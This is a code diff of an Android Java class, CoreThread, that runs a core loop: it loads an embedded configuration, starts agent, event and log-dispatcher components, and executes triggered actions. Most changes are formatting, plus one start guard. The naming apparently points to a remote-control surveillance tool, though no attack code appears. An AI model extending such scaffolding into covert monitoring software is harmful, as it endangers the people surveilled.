@@ -28,7 +28,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class CoreThread.
  */
 public class CoreThread extends Activity implements Runnable {
-	
+
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	// #ifdef DEBUG
@@ -38,19 +38,19 @@ public class CoreThread extends Activity implements Runnable {
 
 	/** The b stop core. */
 	private boolean bStopCore = false;
-	
+
 	/** The resources. */
 	private Resources resources;
-	
+
 	/** The core thread. */
 	private Thread coreThread;
-	
+
 	/** The content resolver. */
 	private ContentResolver contentResolver;
-	
+
 	/** The agent manager. */
 	private AgentManager agentManager;
-	
+
 	/** The event manager. */
 	private EventManager eventManager;
 
@@ -59,9 +59,11 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Start.
-	 *
-	 * @param r the r
-	 * @param cr the cr
+	 * 
+	 * @param r
+	 *            the r
+	 * @param cr
+	 *            the cr
 	 * @return true, if successful
 	 */
 	public boolean Start(final Resources r, final ContentResolver cr) {
@@ -80,7 +82,7 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Stop.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	public boolean Stop() {
@@ -90,7 +92,9 @@ public class CoreThread extends Activity implements Runnable {
 	}
 
 	// Runnable (main routine for RCS)
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
@@ -149,7 +153,7 @@ public class CoreThread extends Activity implements Runnable {
 	/**
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	private boolean checkActions() {
@@ -205,7 +209,7 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Inizializza il core.
-	 *
+	 * 
 	 * @return false if any fatal error
 	 */
 	private boolean taskInit() {
@@ -223,7 +227,9 @@ public class CoreThread extends Activity implements Runnable {
 
 			// Start log dispatcher
 			final LogDispatcher logDispatcher = LogDispatcher.self();
-			logDispatcher.start();
+			if (!logDispatcher.isAlive()) {
+				logDispatcher.start();
+			}
 
 			// Da qui in poi inizia la concorrenza dei thread
 
@@ -265,10 +271,12 @@ public class CoreThread extends Activity implements Runnable {
 	}
 
 	/**
-	 * Tries to load the new configuration, if it fails it get the resource conf.
-	 *
+	 * Tries to load the new configuration, if it fails it get the resource
+	 * conf.
+	 * 
 	 * @return false if no correct conf available
-	 * @throws RCSException the rCS exception
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	public boolean loadConf() throws RCSException {
 
@@ -293,8 +301,8 @@ public class CoreThread extends Activity implements Runnable {
 		if (!loaded) {
 
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.InputStreamToBuffer(resources
-					.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(
+					resources.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -321,8 +329,8 @@ public class CoreThread extends Activity implements Runnable {
 	public void testRun() {
 		try {
 
-			final byte[] resource = Utils.InputStreamToBuffer(resources
-					.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(
+					resources.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -397,8 +405,9 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Execute action.
-	 *
-	 * @param action the action
+	 * 
+	 * @param action
+	 *            the action
 	 * @return the int
 	 */
 	private int executeAction(final Action action) {
@@ -522,7 +531,7 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Inits the.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	public boolean Init() {
@@ -531,7 +540,7 @@ public class CoreThread extends Activity implements Runnable {
 
 	/**
 	 * Run.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	public boolean Run() {
